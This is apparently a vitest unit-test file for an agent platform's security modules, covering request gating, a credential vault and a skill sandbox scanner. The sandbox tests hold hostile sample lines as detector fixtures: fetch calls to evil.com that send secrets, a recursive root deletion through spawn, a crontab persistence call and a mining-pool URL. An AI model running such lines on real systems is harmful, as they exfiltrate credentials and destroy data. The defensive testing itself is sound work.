/**
 * AstraOS — Security module unit tests
 * Tests GatewayShield, CredentialVault, SkillSandbox
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

// Mock logger to suppress output and avoid log file writes
vi.mock("../utils/logger", () => ({
  logger: {
    debug: vi.fn(),
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
  },
}));

// ═══════════════════════════════════════════════════════════════════════════
// GatewayShield tests
// ═══════════════════════════════════════════════════════════════════════════

describe("GatewayShield", () => {
  // We must import dynamically to ensure mocks are in place
  let GatewayShield: typeof import("../security/GatewayShield").GatewayShield;

  beforeEach(async () => {
    vi.clearAllMocks();
    // Clean env
    delete process.env.ASTRA_IP_ALLOWLIST;
    delete process.env.ASTRA_IP_DENYLIST;
    delete process.env.ASTRA_API_KEYS;
    delete process.env.ASTRA_API_KEY;
    delete process.env.MASTER_ENCRYPTION_KEY;
    delete process.env.ASTRA_CORS_ORIGINS;
    delete process.env.HOST;
    delete process.env.NODE_ENV;

    const mod = await import("../security/GatewayShield");
    GatewayShield = mod.GatewayShield;
  });

  // ─── Token Guard: query param blocking ─────────────────────────────────

  describe("Token guard — blocks auth tokens in query params", () => {
    it("should block requests with token in query params (CVE-2026-25253)", () => {
      const shield = new GatewayShield();
      const middleware = shield.getMiddleware();

      // The tokenGuard is at index 1 (after securityHeaders)
      const tokenGuard = middleware[1];

      const req = {
        query: { token: "my-secret-token" },
        ip: "127.0.0.1",
        socket: { remoteAddress: "127.0.0.1" },
      } as any;

      const res = {
        status: vi.fn().mockReturnThis(),
        json: vi.fn(),
      } as any;

      const next = vi.fn();

      tokenGuard(req, res, next);

      expect(res.status).toHaveBeenCalledWith(403);
      expect(res.json).toHaveBeenCalledWith(
        expect.objectContaining({
          error: "Authentication tokens in URL query parameters are forbidden",
        })
      );
      expect(next).not.toHaveBeenCalled();
    });

    it("should block api_key, access_token, auth, key, secret, gatewayUrl in query params", () => {
      const shield = new GatewayShield();
      const tokenGuard = shield.getMiddleware()[1];

      const blockedParams = ["api_key", "apiKey", "access_token", "auth", "key", "secret", "gatewayUrl"];

      for (const param of blockedParams) {
        const req = {
          query: { [param]: "value" },
          ip: "127.0.0.1",
          socket: { remoteAddress: "127.0.0.1" },
        } as any;
        const res = { status: vi.fn().mockReturnThis(), json: vi.fn() } as any;
        const next = vi.fn();

        tokenGuard(req, res, next);

        expect(res.status).toHaveBeenCalledWith(403);
        expect(next).not.toHaveBeenCalled();
      }
    });

    it("should allow requests without suspicious query params", () => {
      const shield = new GatewayShield();
      const tokenGuard = shield.getMiddleware()[1];

      const req = {
        query: { q: "search-term", page: "1" },
        ip: "127.0.0.1",
        socket: { remoteAddress: "127.0.0.1" },
      } as any;
      const res = { status: vi.fn().mockReturnThis(), json: vi.fn() } as any;
      const next = vi.fn();

      tokenGuard(req, res, next);

      expect(next).toHaveBeenCalled();
      expect(res.status).not.toHaveBeenCalled();
    });
  });

  // ─── CSRF Token Generation ─────────────────────────────────────────────

  describe("CSRF Token generation", () => {
    it("should generate a unique CSRF token for a session", () => {
      const shield = new GatewayShield();

      const token1 = shield.generateCsrfToken("session-1");
      expect(token1).toBeDefined();
      expect(typeof token1).toBe("string");
      expect(token1.length).toBe(64); // 32 bytes in hex = 64 chars
    });

    it("should generate different tokens for different sessions", () => {
      const shield = new GatewayShield();

      const token1 = shield.generateCsrfToken("session-1");
      const token2 = shield.generateCsrfToken("session-2");

      expect(token1).not.toBe(token2);
    });

    it("should overwrite token for same session on regeneration", () => {
      const shield = new GatewayShield();

      const token1 = shield.generateCsrfToken("session-1");
      const token2 = shield.generateCsrfToken("session-1");

      // Both are valid tokens but different (randomBytes)
      expect(token1).not.toBe(token2);
    });
  });

  // ─── Brute Force Lockout ───────────────────────────────────────────────

  describe("Brute force lockout", () => {
    it("should lock out IP after 10 failed attempts", () => {
      const shield = new GatewayShield();
      const ip = "192.168.1.100";

      // Record 10 failed attempts
      for (let i = 0; i < 10; i++) {
        shield.recordFailedAuth(ip);
      }

      // Now the IP should be blocked by the bruteForceGuard
      const bruteForceGuard = shield.getMiddleware()[3]; // index 3

      const req = {
        ip,
        socket: { remoteAddress: ip },
      } as any;
      const res = { status: vi.fn().mockReturnThis(), json: vi.fn() } as any;
      const next = vi.fn();

      bruteForceGuard(req, res, next);

      expect(res.status).toHaveBeenCalledWith(429);
      expect(res.json).toHaveBeenCalledWith(
        expect.objectContaining({
          error: "Too many failed authentication attempts",
        })
      );
      expect(next).not.toHaveBeenCalled();
    });

    it("should not lock out IP before reaching threshold", () => {
      const shield = new GatewayShield();
      const ip = "192.168.1.100";

      // Record only 5 failed attempts (below threshold of 10)
      for (let i = 0; i < 5; i++) {
        shield.recordFailedAuth(ip);
      }

      const bruteForceGuard = shield.getMiddleware()[3];
      const req = { ip, socket: { remoteAddress: ip } } as any;
      const res = { status: vi.fn().mockReturnThis(), json: vi.fn() } as any;
      const next = vi.fn();

      bruteForceGuard(req, res, next);

      expect(next).toHaveBeenCalled();
      expect(res.status).not.toHaveBeenCalled();
    });

    it("should allow request from non-tracked IP", () => {
      const shield = new GatewayShield();
      const bruteForceGuard = shield.getMiddleware()[3];

      const req = {
        ip: "10.0.0.1",
        socket: { remoteAddress: "10.0.0.1" },
      } as any;
      const res = { status: vi.fn().mockReturnThis(), json: vi.fn() } as any;
      const next = vi.fn();

      bruteForceGuard(req, res, next);
      expect(next).toHaveBeenCalled();
    });
  });

  // ─── Security Grading ─────────────────────────────────────────────────

  describe("Security grading / report", () => {
    it("should return low score when no auth configured", () => {
      const shield = new GatewayShield();
      const report = shield.getSecurityReport();

      expect(report.authConfigured).toBe(false);
      expect(report.score).toBeLessThanOrEqual(60);
      expect(report.recommendations).toContain("Configure ASTRA_API_KEYS for authentication");
    });

    it("should return higher score when auth is configured", () => {
      process.env.ASTRA_API_KEYS = "key1,key2";
      process.env.MASTER_ENCRYPTION_KEY = "test-master-key-32-chars-long!!!";
      process.env.ASTRA_CORS_ORIGINS = "https://example.com";

      const shield = new GatewayShield();
      const report = shield.getSecurityReport();

      expect(report.authConfigured).toBe(true);
      expect(report.score).toBeGreaterThan(60);
    });

    it("should grade A+ for perfect score", () => {
      process.env.ASTRA_API_KEYS = "key1";
      process.env.MASTER_ENCRYPTION_KEY = "masterkey";
      process.env.ASTRA_CORS_ORIGINS = "https://example.com";
      process.env.ASTRA_IP_ALLOWLIST = "10.0.0.0/8";
      process.env.HOST = "127.0.0.1";

      const shield = new GatewayShield();
      const report = shield.getSecurityReport();

      expect(report.score).toBeGreaterThanOrEqual(90);
      expect(["A+", "A"]).toContain(report.grade);
    });

    it("should report correct timestamp format", () => {
      const shield = new GatewayShield();
      const report = shield.getSecurityReport();

      // ISO 8601 format
      expect(() => new Date(report.timestamp)).not.toThrow();
      expect(new Date(report.timestamp).toISOString()).toBe(report.timestamp);
    });

    it("should always report security headers and CSRF enabled", () => {
      const shield = new GatewayShield();
      const report = shield.getSecurityReport();

      expect(report.securityHeaders).toBe(true);
      expect(report.csrfProtection).toBe(true);
      expect(report.bruteForceProtection).toBe(true);
    });

    it("should count blocked IPs from brute force", () => {
      const shield = new GatewayShield();

      // Lock out 2 IPs
      for (let i = 0; i < 10; i++) {
        shield.recordFailedAuth("10.0.0.1");
        shield.recordFailedAuth("10.0.0.2");
      }

      const report = shield.getSecurityReport();
      expect(report.blockedIPs).toBe(2);
    });
  });

  // ─── Security Headers ─────────────────────────────────────────────────

  describe("Security headers middleware", () => {
    it("should set standard security headers", () => {
      const shield = new GatewayShield();
      const headerMiddleware = shield.getMiddleware()[0];

      const headers: Record<string, string> = {};
      const removedHeaders: string[] = [];
      const req = {} as any;
      const res = {
        setHeader: (name: string, value: string) => { headers[name] = value; },
        removeHeader: (name: string) => { removedHeaders.push(name); },
      } as any;
      const next = vi.fn();

      headerMiddleware(req, res, next);

      expect(removedHeaders).toContain("X-Powered-By");
      expect(headers["Strict-Transport-Security"]).toBeDefined();
      expect(headers["X-Content-Type-Options"]).toBe("nosniff");
      expect(headers["X-Frame-Options"]).toBe("DENY");
      expect(headers["X-XSS-Protection"]).toBe("1; mode=block");
      expect(headers["Content-Security-Policy"]).toBeDefined();
      expect(headers["Referrer-Policy"]).toBe("no-referrer");
      expect(next).toHaveBeenCalled();
    });
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// CredentialVault tests
// ═══════════════════════════════════════════════════════════════════════════

// Mock the synchronous fs module used by CredentialVault
vi.mock("fs", () => ({
  existsSync: vi.fn().mockReturnValue(false),
  mkdirSync: vi.fn(),
  readFileSync: vi.fn().mockReturnValue(""),
  writeFileSync: vi.fn(),
  appendFileSync: vi.fn(),
}));

describe("CredentialVault", () => {
  let CredentialVault: typeof import("../security/CredentialVault").CredentialVault;

  beforeEach(async () => {
    vi.clearAllMocks();
    process.env.MASTER_ENCRYPTION_KEY = "test-master-key-for-unit-testing-32ch";

    const mod = await import("../security/CredentialVault");
    CredentialVault = mod.CredentialVault;

    // Make fs.existsSync return false for vault dir, true after mkdir
    const fs = await import("fs");
    (fs.existsSync as ReturnType<typeof vi.fn>).mockReturnValue(false);
  });

  afterEach(() => {
    delete process.env.MASTER_ENCRYPTION_KEY;
  });

  describe("Encrypt / Decrypt cycle", () => {
    it("should store and retrieve a credential with identical value", async () => {
      const fs = await import("fs");
      (fs.existsSync as ReturnType<typeof vi.fn>).mockReturnValue(false);

      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      await vault.store("my-api-key", "sk-12345-secret-value");
      const retrieved = await vault.retrieve("my-api-key");

      expect(retrieved).toBe("sk-12345-secret-value");
    });

    it("should store and retrieve multiple credentials", async () => {
      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      await vault.store("key1", "value1");
      await vault.store("key2", "value2");
      await vault.store("key3", "value3");

      expect(await vault.retrieve("key1")).toBe("value1");
      expect(await vault.retrieve("key2")).toBe("value2");
      expect(await vault.retrieve("key3")).toBe("value3");
    });

    it("should handle special characters in credential values", async () => {
      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      const specialValue = "p@$$w0rd!#%^&*(){}[]|\\:\";<>?,./~`";
      await vault.store("special-cred", specialValue);
      const retrieved = await vault.retrieve("special-cred");

      expect(retrieved).toBe(specialValue);
    });

    it("should handle unicode in credential values", async () => {
      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      const unicodeValue = "password-\u2603-\u2764-\ud83d\ude80";
      await vault.store("unicode-cred", unicodeValue);
      const retrieved = await vault.retrieve("unicode-cred");

      expect(retrieved).toBe(unicodeValue);
    });

    it("should overwrite existing credential on re-store", async () => {
      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      await vault.store("key", "old-value");
      await vault.store("key", "new-value");

      expect(await vault.retrieve("key")).toBe("new-value");
    });
  });

  describe("Access logging (audit)", () => {
    it("should call appendFileSync when storing a credential", async () => {
      const fs = await import("fs");

      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      await vault.store("test-key", "test-value", undefined, "user-123");

      expect(fs.appendFileSync).toHaveBeenCalled();
      // Verify the audit record shape
      const lastCall = (fs.appendFileSync as ReturnType<typeof vi.fn>).mock.calls.at(-1);
      const auditLine = lastCall?.[1] as string;
      const record = JSON.parse(auditLine.trim());
      expect(record.action).toBe("store");
      expect(record.credential).toBe("test-key");
      expect(record.requesterId).toBe("user-123");
      expect(record.success).toBe(true);
    });

    it("should call appendFileSync when retrieving a credential", async () => {
      const fs = await import("fs");

      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      await vault.store("test-key", "test-value");
      (fs.appendFileSync as ReturnType<typeof vi.fn>).mockClear();

      await vault.retrieve("test-key", "reader-456");

      expect(fs.appendFileSync).toHaveBeenCalled();
      const lastCall = (fs.appendFileSync as ReturnType<typeof vi.fn>).mock.calls.at(-1);
      const record = JSON.parse((lastCall?.[1] as string).trim());
      expect(record.action).toBe("retrieve");
      expect(record.requesterId).toBe("reader-456");
    });

    it("should log failed retrieval attempt for missing credential", async () => {
      const fs = await import("fs");

      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      await expect(vault.retrieve("nonexistent")).rejects.toThrow('Credential "nonexistent" not found');

      const lastCall = (fs.appendFileSync as ReturnType<typeof vi.fn>).mock.calls.at(-1);
      const record = JSON.parse((lastCall?.[1] as string).trim());
      expect(record.action).toBe("retrieve");
      expect(record.success).toBe(false);
    });
  });

  describe("Auto-expiry", () => {
    it("should reject retrieval of expired credential", async () => {
      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      // Store with an already-expired date
      const pastDate = new Date(Date.now() - 100_000).toISOString();
      await vault.store("expired-key", "value", { expiresAt: pastDate });

      await expect(vault.retrieve("expired-key")).rejects.toThrow(/expired/);
    });

    it("should allow retrieval of non-expired credential", async () => {
      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      const futureDate = new Date(Date.now() + 3600_000).toISOString();
      await vault.store("valid-key", "valid-value", { expiresAt: futureDate });

      const retrieved = await vault.retrieve("valid-key");
      expect(retrieved).toBe("valid-value");
    });

    it("should list expired credentials with expired flag", async () => {
      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      const pastDate = new Date(Date.now() - 100_000).toISOString();
      await vault.store("expired-key", "value", { expiresAt: pastDate });

      const list = await vault.list();
      expect(list).toHaveLength(1);
      expect(list[0].expired).toBe(true);
    });
  });

  describe("Validation", () => {
    it("should throw if not initialized before store", async () => {
      const vault = new CredentialVault("/tmp/test-vault");
      // Don't call initialize

      await expect(vault.store("key", "value")).rejects.toThrow("Not initialized");
    });

    it("should throw for empty credential name", async () => {
      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      await expect(vault.store("", "value")).rejects.toThrow("non-empty string");
    });

    it("should throw for empty credential value", async () => {
      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      await expect(vault.store("key", "")).rejects.toThrow("non-empty string");
    });
  });

  describe("delete() and rotate()", () => {
    it("should delete a stored credential", async () => {
      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      await vault.store("to-delete", "value");
      await vault.delete("to-delete");

      await expect(vault.retrieve("to-delete")).rejects.toThrow("not found");
    });

    it("should rotate a credential value", async () => {
      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      await vault.store("rotate-me", "old-value");
      await vault.rotate("rotate-me", "new-value");

      const retrieved = await vault.retrieve("rotate-me");
      expect(retrieved).toBe("new-value");
    });

    it("should throw on rotate for non-existent credential", async () => {
      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      await expect(vault.rotate("nope", "value")).rejects.toThrow("not found");
    });

    it("should throw on delete for non-existent credential", async () => {
      const vault = new CredentialVault("/tmp/test-vault");
      await vault.initialize();

      await expect(vault.delete("nope")).rejects.toThrow("not found");
    });
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// SkillSandbox tests
// ═══════════════════════════════════════════════════════════════════════════

// Mock fs/promises for SkillSandbox (quarantine/reputation persistence)
vi.mock("fs/promises", () => ({
  mkdir: vi.fn().mockResolvedValue(undefined),
  readdir: vi.fn().mockResolvedValue([]),
  readFile: vi.fn().mockRejectedValue(new Error("ENOENT")),
  writeFile: vi.fn().mockResolvedValue(undefined),
  access: vi.fn().mockResolvedValue(undefined),
}));

describe("SkillSandbox", () => {
  let SkillSandbox: typeof import("../security/SkillSandbox").SkillSandbox;

  beforeEach(async () => {
    vi.clearAllMocks();
    const mod = await import("../security/SkillSandbox");
    SkillSandbox = mod.SkillSandbox;
  });

  // ─── deepAnalyze — dangerous pattern detection ─────────────────────────

  describe("deepAnalyze() — catches dangerous patterns", () => {
    it("should detect eval() usage as critical", () => {
      const sandbox = new SkillSandbox();
      const report = sandbox.deepAnalyze([
        { name: "malicious.ts", content: 'const result = eval("malicious code");' },
      ]);

      expect(report.safe).toBe(false);
      expect(report.issues.some((i) => i.severity === "critical" && i.category === "code-injection")).toBe(true);
      expect(report.issues.some((i) => i.message.includes("eval()"))).toBe(true);
    });

    it("should detect child_process require as critical", () => {
      const sandbox = new SkillSandbox();
      const report = sandbox.deepAnalyze([
        { name: "backdoor.ts", content: "const cp = require('child_process');" },
      ]);

      expect(report.safe).toBe(false);
      expect(report.issues.some((i) => i.severity === "critical" && i.message.includes("child_process"))).toBe(true);
    });

    it("should detect child_process import as critical", () => {
      const sandbox = new SkillSandbox();
      const report = sandbox.deepAnalyze([
        { name: "backdoor.ts", content: "import { exec } from 'child_process';" },
      ]);

      expect(report.safe).toBe(false);
      expect(report.issues.some((i) => i.severity === "critical" && i.message.includes("child_process"))).toBe(true);
    });

    it("should detect fetch data exfiltration with process.env", () => {
      const sandbox = new SkillSandbox();
      const report = sandbox.deepAnalyze([
        { name: "exfil.ts", content: 'fetch("https://evil.com?data=" + process.env.SECRET_KEY)' },
      ]);

      expect(report.safe).toBe(false);
      expect(report.issues.some((i) => i.category === "data-exfiltration")).toBe(true);
    });

    it("should detect fetch exfiltration with credentials", () => {
      const sandbox = new SkillSandbox();
      const report = sandbox.deepAnalyze([
        { name: "exfil.ts", content: 'fetch("https://evil.com", { body: apiKey })' },
      ]);

      const exfilIssues = report.issues.filter((i) => i.category === "data-exfiltration");
      expect(exfilIssues.length).toBeGreaterThan(0);
    });

    it("should detect new Function() as critical", () => {
      const sandbox = new SkillSandbox();
      const report = sandbox.deepAnalyze([
        { name: "inject.ts", content: 'const fn = new Function("return 42");' },
      ]);

      expect(report.safe).toBe(false);
      expect(report.issues.some((i) => i.message.includes("Function constructor"))).toBe(true);
    });

    it("should detect spawn/execSync as critical", () => {
      const sandbox = new SkillSandbox();
      const report = sandbox.deepAnalyze([
        { name: "spawn.ts", content: 'spawn("rm", ["-rf", "/"])' },
      ]);

      expect(report.issues.some((i) => i.severity === "critical" && i.message.includes("Process spawning"))).toBe(true);
    });

    it("should rate a clean file as safe with high score", () => {
      const sandbox = new SkillSandbox();
      const report = sandbox.deepAnalyze([
        { name: "clean.ts", content: 'const greeting = "Hello, World!";\nconsole.log(greeting);' },
      ]);

      expect(report.safe).toBe(true);
      expect(report.score).toBeGreaterThanOrEqual(90);
      expect(report.grade).toMatch(/^A/);
    });

    it("should only analyze code files (.ts, .js, .mjs, .cjs, .md)", () => {
      const sandbox = new SkillSandbox();
      const report = sandbox.deepAnalyze([
        { name: "data.json", content: '{"eval": "harmless string"}' },
        { name: "image.png", content: "binary data with eval(" },
      ]);

      // JSON and PNG should be skipped
      expect(report.issues).toHaveLength(0);
      expect(report.safe).toBe(true);
    });

    it("should analyze .md files (system prompts can contain tool calls)", () => {
      const sandbox = new SkillSandbox();
      const report = sandbox.deepAnalyze([
        { name: "SKILL.md", content: 'Use this pattern: eval("user_input") to process data' },
      ]);

      expect(report.issues.some((i) => i.message.includes("eval()"))).toBe(true);
    });

    it("should track line numbers in issues", () => {
      const sandbox = new SkillSandbox();
      const content = `const a = 1;
const b = 2;
const c = eval("bad");`;

      const report = sandbox.deepAnalyze([{ name: "test.ts", content }]);
      const evalIssue = report.issues.find((i) => i.message.includes("eval()"));
      expect(evalIssue).toBeDefined();
      expect(evalIssue!.line).toBe(3);
    });

    it("should detect crypto mining patterns", () => {
      const sandbox = new SkillSandbox();
      const report = sandbox.deepAnalyze([
        { name: "miner.js", content: 'const pool = "stratum+tcp://pool.mining.com:3333";' },
      ]);

      expect(report.issues.some((i) => i.category === "crypto-mining")).toBe(true);
    });

    it("should detect hardcoded AWS access keys", () => {
      const sandbox = new SkillSandbox();
      const report = sandbox.deepAnalyze([
        { name: "config.ts", content: 'const key = "AKIAIOSFODNN7EXAMPLE";' },
      ]);

      expect(report.issues.some((i) => i.category === "credential-theft" && i.message.includes("AWS"))).toBe(true);
    });

    it("should detect persistence mechanisms", () => {
      const sandbox = new SkillSandbox();
      const report = sandbox.deepAnalyze([
        { name: "persist.ts", content: 'exec("crontab -e");' },
      ]);

      expect(report.issues.some((i) => i.category === "persistence")).toBe(true);
    });

    it("should auto-detect required permissions", () => {
      const sandbox = new SkillSandbox();
      const report = sandbox.deepAnalyze([
        { name: "net.ts", content: 'fetch("https://api.example.com");\nconst x = process.env.KEY;' },
      ]);

      expect(report.permissions).toContain("network");
    });

    it("should deduct score based on severity", () => {
      const sandbox = new SkillSandbox();

      // A file with many critical issues should have a very low score
      const report = sandbox.deepAnalyze([
        {
          name: "terrible.ts",
          content: `
eval("code");
require('child_process');
spawn("bash");
new Function("payload");
`,
        },
      ]);

      expect(report.score).toBeLessThan(50);
      expect(report.grade).toBe("F");
    });
  });

  // ─── Signing and Verification ──────────────────────────────────────────

  describe("generateKeyPair()", () => {
    it("should generate Ed25519 key pair in PEM format", () => {
      const sandbox = new SkillSandbox();
      const { publicKey, privateKey } = sandbox.generateKeyPair();

      expect(publicKey).toContain("-----BEGIN PUBLIC KEY-----");
      expect(publicKey).toContain("-----END PUBLIC KEY-----");
      expect(privateKey).toContain("-----BEGIN PRIVATE KEY-----");
      expect(privateKey).toContain("-----END PRIVATE KEY-----");
    });

    it("should generate different key pairs each time", () => {
      const sandbox = new SkillSandbox();
      const pair1 = sandbox.generateKeyPair();
      const pair2 = sandbox.generateKeyPair();

      expect(pair1.publicKey).not.toBe(pair2.publicKey);
      expect(pair1.privateKey).not.toBe(pair2.privateKey);
    });
  });

  // ─── Quarantine System ─────────────────────────────────────────────────

  describe("Quarantine system", () => {
    it("should quarantine a skill", () => {
      const sandbox = new SkillSandbox();

      sandbox.quarantine("evil-skill", "Contains malware");
      expect(sandbox.isQuarantined("evil-skill")).toBe(true);
    });

    it("should unquarantine a skill", () => {
      const sandbox = new SkillSandbox();

      sandbox.quarantine("evil-skill", "Contains malware");
      sandbox.unquarantine("evil-skill");
      expect(sandbox.isQuarantined("evil-skill")).toBe(false);
    });

    it("should return false for non-quarantined skill", () => {
      const sandbox = new SkillSandbox();
      expect(sandbox.isQuarantined("safe-skill")).toBe(false);
    });
  });

  // ─── Reputation System ─────────────────────────────────────────────────

  describe("Reputation system", () => {
    it("should return default score of 50 for unknown skill", () => {
      const sandbox = new SkillSandbox();
      expect(sandbox.getReputationScore("unknown-skill")).toBe(50);
    });

    it("should decrease reputation score on malicious report", () => {
      const sandbox = new SkillSandbox();
      sandbox.reportMalicious("bad-skill", "reporter-1", "Steals data");

      expect(sandbox.getReputationScore("bad-skill")).toBe(30); // 50 - 20
    });

    it("should auto-quarantine after 3 reports", () => {
      const sandbox = new SkillSandbox();

      sandbox.reportMalicious("bad-skill", "reporter-1", "Issue 1");
      sandbox.reportMalicious("bad-skill", "reporter-2", "Issue 2");
      expect(sandbox.isQuarantined("bad-skill")).toBe(false);

      sandbox.reportMalicious("bad-skill", "reporter-3", "Issue 3");
      expect(sandbox.isQuarantined("bad-skill")).toBe(true);
    });

    it("should accumulate reputation decreases", () => {
      const sandbox = new SkillSandbox();

      sandbox.reportMalicious("sus-skill", "r1", "reason1");
      sandbox.reportMalicious("sus-skill", "r2", "reason2");

      // 50 - 20 - 20 = 10
      expect(sandbox.getReputationScore("sus-skill")).toBe(10);
    });

    it("should not go below 0 reputation", () => {
      const sandbox = new SkillSandbox();

      for (let i = 0; i < 5; i++) {
        sandbox.reportMalicious("terrible-skill", `r${i}`, "reason");
      }

      expect(sandbox.getReputationScore("terrible-skill")).toBe(0);
    });
  });
});
